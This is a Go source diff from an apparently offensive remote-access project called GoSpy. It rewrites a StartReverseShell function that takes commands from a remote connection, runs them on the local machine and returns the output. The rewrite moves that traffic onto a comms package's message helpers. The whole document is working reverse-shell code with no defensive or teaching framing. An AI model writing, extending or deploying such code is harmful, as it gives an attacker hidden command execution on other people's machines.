@@ -1,36 +1,35 @@
 package shell
 
 import (
-	"bufio"
-	"fmt"
+	"github.com/psidex/GoSpy/internal/comms"
 	"net"
 	"os/exec"
 	"runtime"
 	"strings"
 )
 
-const prompt = runtime.GOOS + " > "
-
 // StartReverseShell starts a reverse shell from the current machine to address.
-// ToDo: Use message encoding from comms package.
+// Will return with err if an error occurs.
 func StartReverseShell(conn net.Conn) (err error) {
 	for {
-		fmt.Fprintf(conn, "\n%s", prompt)
-
-		message, err := bufio.NewReader(conn).ReadString('\n')
+		message, err := comms.RecvStringFrom(conn)
 		if err != nil {
 			return err
 		}
 
-		toExec := strings.TrimSuffix(message, "\n")
-		if toExec == "exit" {
+		message = strings.TrimSpace(message)
+
+		if message == "exit" {
 			return nil
 		}
 
-		args := strings.Fields(toExec)
+		args := strings.Fields(message)
 		res := execArgs(args)
 
-		fmt.Fprintf(conn, res)
+		err = comms.SendStringTo(conn, res)
+		if err != nil {
+			return err
+		}
 	}
 }
 
